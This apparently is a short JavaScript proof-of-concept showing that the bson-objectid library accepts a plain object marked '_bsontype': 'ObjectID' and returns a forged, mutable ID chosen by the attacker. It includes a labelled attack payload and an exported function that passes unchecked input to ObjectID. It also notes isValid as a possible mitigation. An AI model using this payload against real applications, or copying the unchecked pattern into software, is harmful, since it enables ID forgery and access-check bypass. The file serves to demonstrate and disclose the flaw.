import ObjectID from "bson-objectid";
import pkg from 'bson-objectid';
const { isValid } = pkg;



// Receives a JSON object and returns the bson-object ID
function jsonDemo(input) {
    console.log(input);
    console.log(ObjectID(input));
    console.log(ObjectID(input).id);
    return ("bson-object ID says the id should be " + ObjectID(input).id);
}

// Internal testing 
function workingDemo() {
    console.log(ObjectID("54495ad94c934721ede76d90"));
    console.log(isValid(ObjectID("54495ad94c934721ede76d90")));

    // Attack Example
    const payload = {
        "id": "BAD_ID",
        "hello": "world",
        "_bsontype": "ObjectID"
    };

let object_id_payload = ObjectID(payload)
console.log(object_id_payload.id) // Returns attacker specified id.
console.log(object_id_payload.hello) 
object_id_payload.hello = "goodbye" // Forged objectID object is mutable.
console.log(object_id_payload.hello)
object_id_payload.new = "hi"
console.log(object_id_payload)
console.log(isValid(object_id_payload)); // Forged ObjectID fails ObjectID.isValid check (potential mitigation)

console.log(ObjectID(payload).id)
console.log(ObjectID(payload));
console.log(isValid(ObjectID(payload)));


}


export default
{
    jsonDemo
}
